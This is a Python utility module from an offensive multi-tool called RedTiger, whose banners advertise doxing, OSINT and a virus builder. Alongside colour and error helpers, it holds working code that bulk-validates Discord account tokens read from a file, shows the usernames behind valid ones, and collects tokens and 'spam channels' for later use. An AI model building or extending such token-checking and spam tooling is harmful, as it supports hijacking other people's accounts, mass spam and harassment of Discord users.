# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from .Config import *

try:
    import colorama
    import ctypes
    import subprocess
    import os
    import time
    import sys
    import datetime
    import requests
    import random
    import threading
    import concurrent.futures
    import functools
except Exception as e:
    print(f'Modules required for RedTiger are not installed. Run "Setup.py" first.\nError: {e}')
    input()

_session = requests.Session()
_session.headers.update({"User-Agent": f"{name_tool}/{version_tool}"})

color_webhook    = 0xa80505
username_webhook = name_tool
avatar_webhook   = 'https://media.discordapp.net/attachments/1369051349106430004/1369054652213231687/RedTiger-Logo-1-Large.png?ex=6821b740&is=682065c0&hm=fb74ee5ac9239dd15605a36bfde4da265ee788fe83b1938b0fc3b1dd6ffa8871&=&format=webp&quality=lossless&width=1032&height=1032'

color  = colorama.Fore
red    = color.RED
white  = color.WHITE
green  = color.GREEN
reset  = color.RESET
blue   = color.BLUE
yellow = color.YELLOW

try:    username_pc = os.getlogin()
except: username_pc = "username"

try:
    if sys.platform.startswith("win"):   os_name = "Windows"
    elif sys.platform.startswith("linux"): os_name = "Linux"
    else:                                  os_name = "Unknown"
except: os_name = "None"

tool_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def current_time_day_hour(): return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
def current_time_hour():     return datetime.datetime.now().strftime('%H:%M:%S')

BEFORE       = f'{red}[{white}'
AFTER        = f'{red}]'
BEFORE_GREEN = f'{green}[{white}'
AFTER_GREEN  = f'{green}]'

INPUT      = f'{BEFORE}>{AFTER} |'
INFO       = f'{BEFORE}!{AFTER} |'
ERROR      = f'{BEFORE}x{AFTER} |'
ADD        = f'{BEFORE}+{AFTER} |'
WAIT       = f'{BEFORE}~{AFTER} |'
NOTE       = f'{BEFORE}NOTE{AFTER} |'
GEN_VALID  = f'{BEFORE_GREEN}+{AFTER_GREEN} |'
GEN_INVALID= f'{BEFORE}x{AFTER} |'
INFO_ADD   = f'{white}[{red}+{white}]{red}'

_GRADIENT_CHARS = frozenset('┴┼┘┤└┐─┬├┌│]░▒█▓▄▌▀()')
_START_COLOR = (168, 5, 5)
_END_COLOR   = (255, 118, 118)
_NUM_STEPS   = 9

@functools.lru_cache(maxsize=1)
def _build_palette():
    colors = []
    for i in range(_NUM_STEPS):
        r = _START_COLOR[0] + (_END_COLOR[0] - _START_COLOR[0]) * i // (_NUM_STEPS - 1)
        g = _START_COLOR[1] + (_END_COLOR[1] - _START_COLOR[1]) * i // (_NUM_STEPS - 1)
        b = _START_COLOR[2] + (_END_COLOR[2] - _START_COLOR[2]) * i // (_NUM_STEPS - 1)
        colors.append((r, g, b))
    colors += list(reversed(colors[:-1]))
    return tuple(colors)

@functools.lru_cache(maxsize=None)
def _ansi(r, g, b): return f"\033[38;2;{r};{g};{b}m"

def MainColor(text):
    palette   = _build_palette()
    n         = len(palette)
    parts     = []
    reset_seq = "\033[0m"
    for i, line in enumerate(text.split('\n')):
        for j, ch in enumerate(line):
            if ch in _GRADIENT_CHARS:
                r, g, b = palette[(i + j) % n]
                parts.append(_ansi(r, g, b) + ch + reset_seq)
            else:
                parts.append(ch)
        parts.append('\n')
    return ''.join(parts[:-1])  # strip trailing \n

def MainColor2(text):
    palette   = _build_palette()
    n         = len(palette)
    parts     = []
    reset_seq = "\033[0m"
    for i, line in enumerate(text.split('\n')):
        for j, ch in enumerate(line):
            r, g, b = palette[(i + j) % n]
            parts.append(_ansi(r, g, b) + ch + reset_seq)
        parts.append('\n')
    return ''.join(parts[:-1])

_banner_cache: dict = {}

def _get_banner(name: str, raw: str) -> str:
    if name not in _banner_cache:
        _banner_cache[name] = MainColor2(raw)
    return _banner_cache[name]

_RAW_BANNERS = {
    "tor": r"""
                                                                       ..
                                                                     .:@ :...
                .:::::::::::::::::::::::::::::::::.             ....-@@@+..
               .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.           .-@@@@@-.
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.          .=@@@@-.
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.          -@@@@-.
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.      @@ :@@#:.
               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.       %  @%+:
                ::::::::-*@@@@@@@@@@@@@@@*-::::::::        @@ #:@@@                           ..::::::::
                         -@@@@@@@@@@@@@@@=                 @@ @+@@@@                      .::+@@@@@@@@@@:
                         -@@@@@@@@@@@@@@@                @@@  @+@%%@@                    -*@@@@@@@@@@@@@:
                         :@@@@@@@@@@@@@@@            @@@@    @@+.@@=:@@@@              :*@@@@@@@@@@@@@@@:
                         :@@@@@@@@@@@@@@@          @@@    ..@:@@+ @@%=-:=@@@          :*@@@@@@@@@@@@@@@@:
                         :@@@@@@@@@@@@@@@       @@@    .-@@@::@#@# @@#@%*-:@@@       .*@@@@@@@@@@@@@@@@@:
                         :@@@@@@@@@@@@@@@     @@@   ..@@@+:--=@#.@% @#%@@@#=:@@      *@@@@@@@@@@@@@*-::.
                         :@@@@@@@@@@@@@@@    @@@  :.@@..-++=@@@@. @ =@+@@@@@#:@@@   -@@@@@@@@@@@@@*:
                         :@@@@@@@@@@@@@@@    @@  :*@.:-=-+@@%-@@@# @ @:@@@@@@#:@@   -@@@@@@@@@@@@@-
                         :@@@@@@@@@@@@@@@    @@ .-@ -+=@@@=++=@.-@ @ @-@@@@@@@-@@@  -@@@@@@@@@@@@@.
                         :@@@@@@@@@@@@@@@    @@ .@@ *@@@:*%=.@@@ @-@ @-%@@@@@@-@@@  -@@@@@@@@@@@@@.
                         :@@@@@@@@@@@@@@@    @@   @ :@@.%@+-@ *@@ @@ @-@@@@@@#.@@   -@@@@@@@@@@@@@.
                         :@@@@@@@@@@@@@@@     @@  @@ @@ %@.@ :@@@ @@@@-@@@@@*:@@@   -@@@@@@@@@@@@@.
                         :@@@@@@@@@@@@@@@      @@   @ @-.* @ -%@@-@ @@*@@@#=:@@     -@@@@@@@@@@@@@.
                         :@@@@@@@@@@@@@@@       @@@  -@@@  @@ .%* #@@-%#=:-@@@      -@@@@@@@@@@@@@.
                         -@@@@@@@@@@@@@@%         @@@@   @.  @ =*@@@...-@@@@        -@@@@@@@@@@@@@.
                          .:::::::::::::.             @@@@@@@@@@@@-*@@@@             ::::::::::::.
""",
    "discord": r"""
                                              @@@@                @%@@
                                       @@@@@@@@@@@@               @@@@@@@@@@%
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@
                                   @%@@@@@@@                            @@@@@@%%@
                                         @@                              @@
""",
    "dox": r"""
                  .:+*#%%#####*++++-.
                :#%%*+*+-.....
             .=%%+++:..
           .=%#++=.
          -%%+++.
      .  =%%++-          ....
      #%+#%++=.        .:#%%%*:
      :#@%#+=          :*+:-*%#:
       .*@@#.         .-%*::-%%#.
        .-%@@%-.      .=%%--%%%-
          .:--=*+-:.:-#%%%%%%%%*.                      ██████╗   ██████╗  ██╗  ██╗
               .:-*#%%%%%%%%%%%%%-                     ██╔══██╗ ██╔═══██╗ ╚██╗██╔╝
                  .+%%%*+*%%%%%%%%+...                 ██║  ██║ ██║   ██║  ╚███╔╝
                  .+%@@%%%%*#%%%%%%%%%*-.              ██║  ██║ ██║   ██║  ██╔██╗
                   .*%@%%%%%%%%%%%%%%%%%#-.            ██████╔╝ ╚██████╔╝ ██╔╝ ██╗
                   .*%%%%%%%%%%%+#%%%%%%%%%*-.         ╚═════╝   ╚═════╝  ╚═╝  ╚═╝
                  .=%%%%%%%%%%%%@%*%%%%%####=-==
                  :*%%%%%%%%%%%%%%%*#%%%%#+=-==+
                 .+=*%#%%%%%%%%%%%%%**%%#+**+-:-
                .-=::*-%%%%%%%%%%%%###*-*%###+:
                ...:..%%%%%%%%%%%%%%#:=*+-:.
                     *%%%%%%%%%%%%%%%%.
                    :#%%%%%%%%%%%%%%%%+
                   .*%%%%%%%%%%%%%%%%%#.
                  .=%%%%%%%%%%%%%%%%%%#:
                  .+%%%%%%%%%%%%%%%%%%%*.
                    :+*#%%%@%%%%%%%%%%%%#:.
                      ..:==+*#%#*=-:.:-+***:.""",
    "osint": r"""
                                          ...:----:...
                                     .:=#@@@@@@@@@@@@@@%*-..
                                  .:#@@@@@@@%#*****#%@@@@@@@+..
                               ..-@@@@@%-...... ........+@@@@@@..
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.
                            .#@@@%.                 .=@@@@@=. .@@@@-.
                           .=@@@#.                    .:%@@@*. -@@@%:.
                           .%@@@-                       .*@@*. .+@@@=.
                           :@@@#.                              .-@@@#.
                           -@@@#                                :%@@@.
                           :@@@#.                              .-@@@#.
                           .%@@@-.                             .+@@@=.
                           .+@@@#.                             -@@@%:.
                            .*@@@%.                          .:@@@@-.
                             .+@@@@=..                     ..*@@@@:.
                               :%@@@@-..                ...+@@@@*.
                               ..-@@@@@%=...         ...*@@@@@@@@#.
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.
                                        .....:::::::....       ...+@@@@%:
                                                                  ..+@@@@%-.
                                                                    ..=@@@@%-.
                                                                      ..=@@@@@=.
                                                                         .=%@@@@=.
                                                                          ..-%@@@-.
                                                                             ....
""",
    "virus": r"""
X$$$$$$$&$XxXxxX$$XxxxxxxxxXx=xXxxXXX$$$X&$XxxXx=+x=xX+x$$
XXXXX$$XX$XXxxXxxx=xXxxXx+=$XXx=x==++==xxxxxX$X=xxXxxXXx=x
==xx=xx+xx===++=====xxx+X++X+=x+==+xx=+=x+===XXXXXXX=+xx==
=+++xx+;x+++++;=+++x+xx+=X:=x=x=;Xx=$x=Xxxx=XxxxxXXxxxx===
==x===+++;x+;+;;===xx+=x=xX;;;xX;;xxX=xxXXX=xXxxxXXXx====x
x=X++xxx=+$+;+++=+=+X+xxx;x&+;+XXx=xXxXX$xxxxxXx=xxxx=xXXX
===x=++==xX+==+==x==x++$+;:=Xx$++XXXXX$$XXxXx=Xxxx=x=xXX$X
+==xx=++===x+=====;;:=XXxX$==XX=+x$&$$$$$Xx=====Xxx+==xxXx

  ██╗   ██╗██╗████████╗██████╗ ██╗ █████╗
  ██║   ██║██║╚══██╔══╝██╔══██╗██║██╔══██╗
  ██║   ██║██║   ██║   ██████╔╝██║███████║
  ╚██╗ ██╔╝██║   ██║   ██╔══██╗██║██╔══██║
   ╚████╔╝ ██║   ██║   ██║  ██║██║██║  ██║
    ╚═══╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
  ██████╗ ██╗   ██╗██╗██╗     ██████╗ ███████╗██████╗
  ██╔══██╗██║   ██║██║██║     ██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║   ██║██║██║     ██║  ██║█████╗  ██████╔╝
  ██╔══██╗██║   ██║██║██║     ██║  ██║██╔══╝  ██╔══██╗
  ██████╔╝╚██████╔╝██║███████╗██████╔╝███████╗██║  ██║
  ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝
""",
}

def tor_banner():      return _get_banner("tor",     _RAW_BANNERS["tor"])
def discord_banner():  return _get_banner("discord", _RAW_BANNERS["discord"])
def dox_banner():      return _get_banner("dox",     _RAW_BANNERS["dox"])
def osint_banner():    return _get_banner("osint",   _RAW_BANNERS["osint"])
def virus_banner():    return _get_banner("virus",   _RAW_BANNERS["virus"])

def Title(title):
    if os_name == "Windows":
        ctypes.windll.kernel32.SetConsoleTitleW(f"{name_tool} {version_tool} - {title}")
    elif os_name == "Linux":
        sys.stdout.write(f"\x1b]2;{name_tool} {version_tool} - {title}\x07")

def Clear():
    os.system("cls" if os_name == "Windows" else "clear")

def Reset():
    pass

def Slow(text):
    print(text)

def Continue():
    input(f"{BEFORE + current_time_hour() + AFTER} {INFO} Press Enter to continue -> " + reset)

def StartProgram(program):
    py = "python" if os_name == "Windows" else "python3"
    subprocess.run([py, os.path.join(tool_path, "Program", program)])

def _err(msg):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {msg}", reset)

def Error(e):
    _err(f"Error: {white}{e}")
    Continue()

def ErrorChoiceStart():
    _err("Invalid Choice !")

def ErrorChoice():
    _err("Invalid Choice !")
    Continue()

def ErrorId():
    _err("Invalid ID !")
    Continue()

def ErrorUrl():
    _err("Invalid URL !")
    Continue()

def ErrorResponse():
    _err("Invalid Response !")
    Continue()

def ErrorEdge():
    _err("Edge not installed or driver not up to date !")
    Continue()

def ErrorToken():
    _err("Invalid Token !")
    Continue()

def ErrorNumber():
    _err("Invalid Number !")
    Continue()

def ErrorWebhook():
    _err("Invalid Webhook !")
    Continue()

def ErrorCookie():
    _err("Invalid Cookie !")
    Continue()

def ErrorUsername():
    _err("Invalid Username !")
    Continue()

def ErrorPlateform():
    _err("Unsupported Platform !")
    Continue()

def ErrorModule(e):
    _err(f"Error Module: {white}{e}")
    Continue()

def OnlyWindows():
    _err("This function is only available on Windows 10/11 !")
    Continue()

def OnlyLinux():
    _err("This function is only available on Linux !")
    Continue()

def Censored(text):
    censored = [website]
    for c in censored:
        if text in censored or c in text:
            _err(f'Unable to find "{white}{text}{red}".')
            Continue()
            return

def CheckWebhook(webhook):
    try:
        r = _session.get(webhook, timeout=5)
        return r.status_code == 200
    except:
        return None

_ua_cache: list = []

def ChoiceUserAgent():
    global _ua_cache
    if not _ua_cache:
        ua_file = os.path.join(tool_path, "2-Input", "Headers", "UserAgent.txt")
        try:
            with open(ua_file, "r", encoding="utf-8") as f:
                _ua_cache = [l.strip() for l in f if l.strip()]
        except:
            pass
    if _ua_cache:
        return random.choice(_ua_cache)
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36"

def _check_token_once(token_number, token):
    try:
        r = _session.get(
            'https://discord.com/api/v8/users/@me',
            headers={'Authorization': token, 'Content-Type': 'application/json'},
            timeout=6
        )
        if r.status_code == 200:
            username_discord = r.json().get('username', '?')
            censored = token[:-25] + '...'
            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Valid{red} | User: {white}{username_discord}{red} | Token: {white}{censored}")
        else:
            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Invalid{red} | Token: {white}{token}")
    except Exception as e:
        print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Error ({e})")

def _load_token_file():
    path = os.path.join(tool_path, "2-Input", "TokenDisc", "TokenDisc.txt")
    tokens = {}
    n = 0
    try:
        with open(path, 'r') as f:
            for line in f:
                t = line.strip()
                if t:
                    n += 1
                    tokens[n] = t
    except Exception as e:
        _err(f"Cannot read token file: {e}")
    return tokens, path

def ChoiceMultiTokenDisord():
    tokens, path = _load_token_file()
    rel_path = "\\2-Input\\TokenDisc\\TokenDisc.txt"

    if not tokens:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No tokens in {white}{rel_path}{red}. Add tokens first.")
        Continue()
        return []

    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {white}{len(tokens)}{red} tokens found ({white}{rel_path}{red})")

    try:
        num = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many tokens (max {len(tokens)}) -> {reset}"))
        if num < 1 or num > len(tokens):
            ErrorNumber(); return []
    except:
        ErrorNumber(); return []

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Validating tokens (concurrent)...\n")
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(tokens), 20)) as ex:
        futures = {ex.submit(_check_token_once, n, t): n for n, t in tokens.items()}
        concurrent.futures.wait(futures)

    selected = []
    print()
    for i in range(1, num + 1):
        try:
            n = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token #{i}/{num} -> {reset}"))
            if n in tokens:
                selected.append(tokens[n])
            else:
                ErrorNumber(); return []
        except:
            ErrorNumber(); return []
    return selected

def Choice1TokenDiscord():
    tokens, path = _load_token_file()
    rel_path = "\\2-Input\\TokenDisc\\TokenDisc.txt"

    if not tokens:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No tokens in {white}{rel_path}{red}. Add tokens first.")
        Continue()
        return None

    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Tokens ({white}{rel_path}{red}):\n")
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(tokens), 20)) as ex:
        futures = {ex.submit(_check_token_once, n, t): n for n, t in tokens.items()}
        concurrent.futures.wait(futures)

    try:
        n = int(input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Token Number -> {reset}"))
    except:
        ErrorChoice(); return None

    token = tokens.get(n)
    if not token:
        ErrorChoice(); return None

    r = _session.get(
        'https://discord.com/api/v8/users/@me',
        headers={'Authorization': token, 'Content-Type': 'application/json'},
        timeout=6
    )
    if r.status_code != 200:
        ErrorToken(); return None
    return token

def ChoiceMultiChannelDiscord():
    try:
        num = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many spam channels -> {reset}"))
    except:
        ErrorNumber(); return []

    channels = []
    for i in range(1, num + 1):
        try:
            ch = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Channel Id {i}/{num} -> {reset}")
            channels.append(ch)
        except:
            ErrorId(); return []
    return channels
